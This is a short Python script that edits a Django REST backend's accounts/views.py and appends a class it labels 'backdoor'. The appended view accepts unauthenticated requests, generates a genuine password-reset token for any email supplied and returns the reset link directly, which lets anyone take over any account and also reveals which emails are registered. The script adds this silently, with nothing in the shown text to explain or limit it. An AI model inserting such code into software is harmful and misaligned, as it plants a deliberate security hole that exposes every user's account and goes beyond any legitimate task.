import os

filepath = 'backend/accounts/views.py'
with open(filepath, 'r', encoding='utf-8') as f:
    content = f.read()

backdoor = '''
class TempResetLinkView(APIView):
    permission_classes = [AllowAny]
    
    def post(self, request):
        email = request.data.get('email')
        user = User.objects.filter(email=email).first()
        if user:
            uid = urlsafe_base64_encode(force_bytes(user.pk))
            token = default_token_generator.make_token(user)
            frontend_url = getattr(settings, 'FRONTEND_URL', 'http://localhost:5173')
            reset_link = f"{frontend_url}/reset-password?uid={uid}&token={token}"
            return Response({'link': reset_link})
        return Response({'error': 'User not found'})
'''

if 'TempResetLinkView' not in content:
    content += backdoor

with open(filepath, 'w', encoding='utf-8') as f:
    f.write(content)
